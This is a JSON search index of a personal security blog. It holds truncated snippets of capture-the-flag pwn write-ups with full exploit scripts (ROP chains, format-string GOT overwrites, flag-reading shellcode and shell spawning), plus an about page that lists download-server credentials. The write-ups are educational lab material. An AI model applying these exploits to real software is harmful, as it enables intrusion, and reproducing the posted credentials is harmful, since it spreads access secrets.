[{"categories":["Announcement"],"content":"About my blog","date":"2023-04-05","objectID":"/2023-04-05-announcement-about-my-blog/","tags":["blog"],"title":"[Pinned] About my blog site","uri":"/2023-04-05-announcement-about-my-blog/"},{"categories":["Announcement"],"content":" About my blog site. TL;DR: ðŸ‘‰ Click select language button in the upper right corner of the page to read posts written in Chinese ðŸ‘‰ Use search box to find an article with keywords ðŸ‘‰ All previous blogs are saved in this site, try to find it~ ðŸ‘‰ Still have a question, email me to roderickchan@foxmail.com I have two same blog sites: https://roderickchan.github.io https://www.roderickchan.cn I have deployed two identical sites, one on Github Pages and the other on a Chinese Aliyun VPS. The purpose of this is to increase the speed of access and to help me backup my blog. I write blog posts in both English and Chinese, and they are stored in separate folders. To switch between languages and read more posts, please click the language switch button. If you encounter a The page you're looking for doesn't exist error, please do not worry as I have recently refactored my site settings, resulting in some changed links. You can search for articles on my blog site using keywords. The search box is located in the upper right corner of the page. For example, you can use house of apple to search for all articles related to house of apple. If you are unable to find search results, please switch to a different language and try again. If you still cannot find what you are looking for, it is possible that I have not written any blogs about the topic you are searching for.ðŸ˜… Some original blog links need to be replaced, for example https://www.roderickchan.cn/2023-02-20-the-art-of-shellcode/ needs to be replaced by https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode/, then it can only be accessed. ","date":"2023-04-05","objectID":"/2023-04-05-announcement-about-my-blog/:0:0","tags":["blog"],"title":"[Pinned] About my blog site","uri":"/2023-04-05-announcement-about-my-blog/"},{"categories":["pwn-wp"],"content":"writeup for sekai-ctf 2022, include two pwn challs: gets and BFS.","date":"2022-10-03","objectID":"/2022-sekaictf-pwn-wp-gets-bfs/","tags":["pwn","rop"],"title":"2022-SekaiCTF-Pwn-Wp-Gets-Bfs","uri":"/2022-sekaictf-pwn-wp-gets-bfs/"},{"categories":["pwn-wp"],"content":" Note: writeup for gets and BFS This ctf game meets The National Day, so I donâ€™t have enough time to play. If you have any questions about my writeup, please leave a message or email me. If images are not loaded, you can click here to download the PDF. 1 Gets\rfirst blood spend 5 hours Itâ€™s a simple challenge, only do gets at main function. All stages in summary : prepare ropchain data at .bss rop attack to call mmap, allocate an rwx page gets(rwx_page) and jmp to run shellcode leak flag by side-channel attack trick The detail information of each stage is following. 1-1 Get Limited Gadgets for Binary\rThis challenge is just about ROP attack, but itâ€™s more complicated than other normal ROP challenges. Because there are not enough gadgets to use. No csu gadgets and only two ppr gadgets exist: 0x000000000040114d: pop rbp; ret; 0x000000000040116a: pop rdi; ret; Fortunately, the magic gadget add dword ptr [rbp - 0x3d], ebx ; nop ; ret can be used, its opcode is 015dc3. To find this gadget by the command: ropper -f ./chall --opcode 015dc3ã€‚ In fact, the magic gadget is powerful, we can change the content of the address if rbp and rbx register is controlled. And we donâ€™t need to leak any address, since the base address makes no difference for add operator. Now, we can control rbp by pop rbp; ret, and we need to find a gadget to control rbx register. 1-2 Find Gadgets to Control Rbx Register\rAs we know, thereâ€™re many glibc address left at stack when a function is called. So, if we do stack pivoting by leave; ret, move the stack to bss segment, call gets again, the glibc address will be left at .bss. Okay, letâ€™s do it and observe the data on stack: to disassemble at 0x7f2b2e0c0514 (_IO_getline_info+292): Once r12 is writable, we can do stack pivot and call this gadget to control rbx register, and weâ€™re able to use magic gadget to change other libc-address left at .bss. In above image, the layout of rop data should be: pop rbp; ret 0x404378 leave; ret And we need to put data at 0x404388 before doing stack pivotï¼Œjust input by getsï¼š pop rdi; ret 0x404388 elf.plt.gets At first, I choose to use magic gadget to change 0x7f2b2e0c0514 (_IO_getline_info+292) to 0x7f2b2e0c0527 (_IO_getline_info+311). Because the r12 register is not always writable. Now, we get a gadget pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15 in .bss, and we can prepare the data , then call the gadget by leave; ret to control rbx/rbp registers. 1-3 Leave More Glibc Address at .Bss\rAs we can control rbx and rbp register, the next stage is to do stack pivot again and again, to leave more glibc address at .bss area. One area is used for build the final ropchain, as I find some gadgets to call mmap(0xdead000, 0x1000, 7, 0x22, -1, 0). This gadget A nearby setcontex is used to control argument registers: This gadget B is used to control rdx register: Another area is used to call gets and input data: 1-4 Construct the Final Ropchain\rIf we want to modify the content of a glibc address left at bss segment , the steps are: input data by calling get(address), prepare data for rbx and rbp leave; ret and call pop rbx; pop rbx;...ret magic gadget to change the content of target address leave; ret to the specific area and do other things The layout of final ropchain should be like: Control rdx register by gadget B, then the arguments registers can be controlled by gadget A, then do stack pivot to call mmap64. Finally, call gets to put shellcode at rwx mapping memory. After doing rop again and again and again, we get the layout: 1-5 Leak Flag by Side-Channel Attack\rOnly read/open/mmap are allowed. Leak the content of flag.txt by side-channel attack, the steps: open flag.txt read flag.txt compare flag.txt byte by byte wait for read if we guess right, otherwise kill the problem Therefor, the shellcode is: sc = \"\"\" push 0x1010101 ^ 0x747874 xor dword ptr [rsp], 0x1010101 mov rax, 0x2e67616c662f7265 push rax mov rax, 0x73752f656d6f682f push rax push rsp pop rdi xor esi, esi xor edx, edx mov","date":"2022-10-03","objectID":"/2022-sekaictf-pwn-wp-gets-bfs/:0:0","tags":["pwn","rop"],"title":"2022-SekaiCTF-Pwn-Wp-Gets-Bfs","uri":"/2022-sekaictf-pwn-wp-gets-bfs/"},{"categories":["pwn-wp"],"content":"writeup for all pwn challenges in 2022 Cyber Apocalypse CTF","date":"2022-05-20","objectID":"/2022-cyber-apocalypse-ctf-all-pwn-wp/","tags":["pwn"],"title":"2022-Cyber-Apocalypse-CTF-All-Pwn-Wp","uri":"/2022-cyber-apocalypse-ctf-all-pwn-wp/"},{"categories":["pwn-wp"],"content":" This is my write-up for all pwn challenges in Cyber-Apocalypse-CTF-2022, I had solved all tasks in two days. Anyway, these pwn challenges are not very hardâ€¦ Please leave a message or send me an email if you have any questions about the wp. 1-Entrypoint\rVulnerability\rIn check_passï¼š Look at the if condition about strncmp, you can input anything except 0nlyTh30r1g1n4l to call open_door, in which function you can get flag: EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] sla(\"\u003e \", \"2\") sa(\"[*] Insert password: \", \"wtf\") ia() 2-SpacepirateGoingDeeper\rVulnerability\rItâ€™s too easy to get flagâ€¦just input DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\\x00 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() context.update(timeout=10) io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] sla(\"\u003e\u003e \", \"2\") sa(\"Username: \", \"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\\x00\") ia() 3-Retribution\rA basic stack overflow challenge. Checksec\rVulnerability\rstack overflow: steps of solution: leak address of glibc using printf use rop to get shell EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] sla(\"\u003e\u003e \", \"2\") sa(\"y =\", \"a\"*8) m = rls(\"[*] New coordinates\") log_ex(m) code_base = u64_ex(m[-6:]) - 0xd70 log_address(\"code addr\", code_base) set_current_code_base(code_base) sa(\"(y/n):\", flat({ 88: [ code_base + 0x0000000000000d33, code_base + 0x202F90, elf.plt.puts, code_base + 0xa22 ] })) set_current_libc_base_and_log(recv_current_libc_addr(), offset='puts') sa(\"y =\", \"a\"*8) sa(\"(y/n):\", flat({ 88: [ code_base + 0x0000000000000d33, libc.search(b\"/bin/sh\").__next__(), libc.sym.system ] })) ia() 4-Vault-Breaker\rA trick of strcpy Vulnerability\rA NULL character would be appended at the end of the dst string in strcpy Use this tip to make random_key to become ?\\x00\\x00\\x00....\\x00, and then in the function secure_password: every byte of the flag xor with every byte of the key, we know x ^ 0 = x, so it puts flag if the random_key consists of NULL character EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io = gift.io def genkey(l): sla(\"\u003e \", \"1\") sla(\"Length of new password (0-31):\", str(l)) ru(\"New key has been genereated successfully!\") for i in range(31, 0, -1): genkey(i) sla(\"\u003e \", \"2\") ru(\"Master password for Vault: \") m = ra() print(m) ia() 5-FleetManagement\rChecksec\ronly rt_sigreturn/openat/senfile are allowed Vulnerability\rinput 9 to write shellcodeï¼š steps: openat(-100, \"flag.txt\", 0) sendfile(1, 3, 0, 0x30) EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] data = asm(shellcraft.amd64.pushstr(\"flag.txt\") + \"\"\" push rsp pop rsi mov edi, 0xffffff9c xor edx, edx xor eax, eax xor r10d, r10d mov eax, {} syscall xor edi, edi xor esi, esi xchg eax, esi inc edi mov r10d, 0x30 mov al, {} syscall \"\"\".format(constants.SYS_openat, constants.SYS_sendfile)) sleep(3) sl(\"1\") io.recvuntil(\"[*] What do you want to do?\", timeout=10) io.recvuntil(\"[*] What do you want to do?\", timeout=10) sl(\"9\") sleep(3) s(data) ia() 6-Hellbound\rVulnerability\rinput 1 to leak stack address, and input 3 to assign buf with *buf: and there is a backdoor function: steps: leak stack address write the address of backdoor at retaddr EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def leak(): sla(\"\u003e\u003e \", \"1\") ru(\"[+] In the back of its head you see this serial number: [\") m = ru(\"]\") stack_addr = int_ex(m[:-1]) log_address(\"stack addr\", stack_addr) return stack_addr def writecode(code): sla(\"\u003e\u003e \", \"2\") sa(\"[*] Write some code: \", co","date":"2022-05-20","objectID":"/2022-cyber-apocalypse-ctf-all-pwn-wp/:0:0","tags":["pwn"],"title":"2022-Cyber-Apocalypse-CTF-All-Pwn-Wp","uri":"/2022-cyber-apocalypse-ctf-all-pwn-wp/"},{"categories":["pwn-wp"],"content":"writeup for all pwn challenges in 2022 sdctf","date":"2022-05-08","objectID":"/2022-sdctf-all-pwn-wp/","tags":["pwn"],"title":"2022-Sdctf-All-Pwn-Wp","uri":"/2022-sdctf-all-pwn-wp/"},{"categories":["pwn-wp"],"content":" I was shocked when I found I stayed in a only-me team. Where are my teammates? Anyway, I have completed all the tasks of pwn in a afternoon. These tasks are not very hard, and it takes me about 4 hours. In fact, I have spent almost 2 hours on solving shamav, this task is a little bit challengeable and interesting. Oil Spill\rChecksec\rNo relro and no pie, the remote glibc version is libc6_2.27-3ubuntu1.5_amd64. Vulnerability\rGlibc address is given, then, we can use printf attack: Solution\rItâ€™s an easy task about fmt-attack. However, I had a problem when I used my exp.py to attack remote host. The problem is that I cannot get any output from the remote host. After I input something, I get the address of puts/printf/temp and then, the program in remote host is stopped. That means I cannot get glibc address before I inputâ€¦â€¦.Maybe itâ€™s caused by my proxy VPN app. In order to solve the problem, I decide to find a way to execute the main function again. The .fini_array section is chosen and I plan to replace .fini_array[0] with main address. Unfortunately, the address of .fini_array is 0x600A40, which contains \\x0a. WTF!!!! Then, I try to use partial overwritting to do ropï¼Œ and I found that thereâ€™s a gadget add rsp, 0x38; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; nearby puts@glibc. 0x0000000000080344: add rsp, 0x38; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 000000000000080970 512 FUNC GLOBAL DEFAULT 13 _IO_puts@@GLIBC_2.2.5 To guess half a byte of the gadget, and use fmt-attack to modify the lowest 2 bytes of puts@got. then make use of magic gadget to change printf@got to one gadget and call printf to get shell. EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() set_remote_libc(\"./libc-2.27.so\") io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] # offset 8 magic = 0x400658 pop_rbx = 0x4007DA write_num = 10099 # 0x0000000000080773: add rsp, 0x48; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; printf_off = 0x64f70 og_off = 0x4f432 if gift.remote: write_num = 9028 printf_off = 0x64e40 og_off = 0x4f302 data = flat_z({ 0:{ 0: f\"%{write_num}c%40$hn\", 80: [ 0x400772, 0x400772, # ret pop_rbx, 0x100000000 + og_off - printf_off, # printf, 0x600c20 + 0x3d, 0, 0, 0, 0, magic, 0x400588, #printf ] }, }, length=0x100) + p64_ex(0x600c18) # puts sleep(1) sl(data) m = rls(\"0x\").split(b\",\") libc_base = int16_ex(m[0]) - libc.sym.puts log_address(\"libc_base\", libc_base) if (libc_base \u0026 0xffff) == 0x2000: log_ex_highlight(\"get shell!\") sl(\"cat flag.txt\") ia() else: ic() use command : for i in $(seq 1 8); do ./exp.py re ./OilSpill oil.sdc.tf:1337 -nl; done to enumerate and get shell. Horoscope\rA basic rop task Vulnerability\rand there are two functions to help you get shell: EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] sl(flat({ 0: \"1/1/1/1/\", 8: { 48: [ elf.sym.debug, elf.sym.test ] } })) r() sl(\"cat flag.txt\") ia() attack remote host: BreakfastMenu\rHeap related, maybe. Checksec\rThe remote glibc version is also libc6_2.27-3ubuntu1.5_amd64. Vulnerability\rThe idx could be a negative number, I call it as int overflow: Solution\rThe steps: create a new order use int overflow to replace got@free with puts@plt and replace exit@got with malloc@got use int overflow to delete an order related malloc@got, actually, it leaks the real address of malloc function use int overflow to modify free@got to system, which is gained by the address of malloc delete an order with /bin/sh to get shell EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() set_remote_libc(\"./libc-2.27.so\") io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def create(): sla(\"4. Pay your bill and leave\\n\", \"1\") ru(\"A new order has been created\\n\") def edit(i, data): sla(\"4. Pay your bill and leave\\n\", \"2\") sla(\"which orde","date":"2022-05-08","objectID":"/2022-sdctf-all-pwn-wp/:0:0","tags":["pwn"],"title":"2022-Sdctf-All-Pwn-Wp","uri":"/2022-sdctf-all-pwn-wp/"},{"categories":null,"content":"\rInfo\rWelcome to my message board! No matter what thoughts, suggestions, or questions you have, feel free to leave a comment here and join the conversation. Every message from you motivates me to keep creating. Thank you for your attention and support!\r","date":"2025-06-07","objectID":"/comment/:0:0","tags":null,"title":"message board","uri":"/comment/"},{"categories":null,"content":" About Me\rC/C++ coder import engineer pytorch programmer linux kernel lover CTF amateur Achievements\rWelcome to use pwncliï¼šhttps://github.com/RoderickChan/pwncli I have proposed three glibc IO FILE attack techniquesï¼š house of apple1 house of apple2 house of apple3 pwn skills coursesï¼š Watch on Bilibili Watch on Youtube Contact Me\rgithub: https://github.com/RoderickChan email: roderickchan@foxmail.com bilibili: https://space.bilibili.com/3461577038629345 youtubeï¼šhttps://studio.youtube.com/channel/UCERZwLUl-Lk8AZ8z0BBo8WQ Other\rThe username and password for download.roderickchan.cn is roderick/rode@rick. You can download any files you need. ","date":"2022-10-02","objectID":"/about/:0:0","tags":null,"title":"About me","uri":"/about/"}]